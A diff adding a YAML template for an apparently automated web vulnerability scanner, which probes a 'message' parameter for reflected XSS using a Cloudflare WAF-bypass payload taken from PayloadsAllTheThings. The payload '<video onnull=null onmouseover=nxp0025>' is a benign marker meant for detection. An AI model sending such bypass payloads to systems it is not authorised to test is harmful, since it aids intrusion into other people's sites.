@@ -1,0 +1,20 @@
+id: patt-xss-cf-02-message
+name: 'PATT xss patt-xss-cf-02 via message'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafcloudflare
+description: 'PATT Cloudflare: event onnull/onmouseover pada <video>. [patt:patt-xss-cf-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      message:
+        - '<video onnull=null onmouseover=nxp0025>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0025'
